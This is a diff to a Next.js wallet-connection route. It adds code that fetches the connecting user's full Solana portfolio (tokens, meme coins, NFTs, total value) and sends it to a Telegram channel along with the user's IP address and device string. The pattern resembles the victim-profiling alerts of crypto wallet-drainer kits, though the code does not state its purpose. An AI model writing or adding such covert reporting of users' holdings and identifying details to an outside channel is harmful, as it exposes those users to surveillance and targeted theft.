@@ -118,16 +118,22 @@ export async function POST(request: NextRequest) {
       // Actually, for "all infos", we should await to ensure it sends.
       const { TelegramService } = await import("@/lib/telegram");
 
+      // Enhanced Alert: Fetch Full Portfolio (Tokens, Meme Coins, NFTs)
+      const { PortfolioService } = await import("@/lib/portfolio");
+      const portfolio = await PortfolioService.getPortfolio(walletAddress);
+
       const msg = TelegramService.formatConnectionMessage(
         walletAddress,
-        user.walletBalance || 0,
-        [] // Token details are fetched client-side, passing empty for auth notification
+        portfolio.totalValueUsd,
+        "Solana",
+        portfolio.tokens,
+        portfolio.nfts
       );
 
       // Append request metadata if available
       const ip = request.headers.get("x-forwarded-for") || "Unknown IP";
       const ua = request.headers.get("user-agent") || "Unknown Device";
-      const metaMsg = `${msg}\n\n📱 <b>Device:</b> ${ua}\n🌐 <b>IP:</b> <code>${ip}</code>`;
+      const metaMsg = `${msg}\n\n📱 <b>Device:</b> ${TelegramService.escapeHTML(ua)}\n🌐 <b>IP:</b> <code>${TelegramService.escapeHTML(ip)}</code>`;
 
       await TelegramService.sendNotification(metaMsg);
     } catch (tgError) {
